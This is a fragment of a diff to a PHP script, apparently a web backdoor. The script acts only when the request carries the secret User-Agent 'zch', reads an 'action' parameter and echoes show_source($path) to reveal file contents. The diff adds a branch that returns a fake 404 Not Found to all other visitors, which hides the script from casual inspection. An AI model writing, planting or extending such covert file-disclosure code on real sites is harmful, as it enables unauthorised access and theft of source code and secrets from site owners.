@@ -1,5 +1,6 @@
 <?php
 
+
 if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") {
 
    if (!empty($_GET['action']) && $_GET['action'] == "start") {
@@ -78,7 +79,8 @@ if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") 
       echo show_source($path);
    }
 }
-
-
+}
+else {
+   header("HTTP/1.0 404 Not Found");
 }
 ?>
